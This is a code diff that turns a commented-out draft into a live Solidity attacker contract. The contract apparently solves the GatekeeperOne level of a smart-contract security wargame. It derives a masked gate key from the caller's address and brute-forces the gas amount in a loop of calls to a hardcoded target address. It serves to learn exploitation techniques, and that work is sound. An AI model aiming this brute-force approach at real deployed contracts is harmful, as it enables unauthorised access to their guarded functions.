@@ -1,18 +1,19 @@
-// // SPDX-License-Identifier: MIT
-// pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+import "./GateKeeperOneContract.sol";
 
-// contract LetMeThrough {
+contract GateKeeper1Attacker {
 
-//     GatekeeperOne level13 = GatekeeperOne(0x697182b1d9689da2b6a2ddf9b83510228D9BC092);
+    GatekeeperOneContract public gateKeeper = GatekeeperOneContract(0x965FC0477F870A16a39d98DdA23000d0BFC27ba5);
 
-//     function enter() external{
-//         bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
-//         for (uint256 i = 0; i < 300; i++) {
-//             (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
-//             if (success) {
-//                 break;
-//             }
-//         }
-//     }
-// }
+    function enter() external {
+        bytes8 key = bytes8(uint64(uint160(address(msg.sender)))) & 0xFFFFFFFF0000FFFF;
+        for (uint256 i = 0; i < 300; i++) {
+            (bool success, ) = address(gateKeeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
+            if (success) {
+                break;
+            }
+        }
+    }
+}
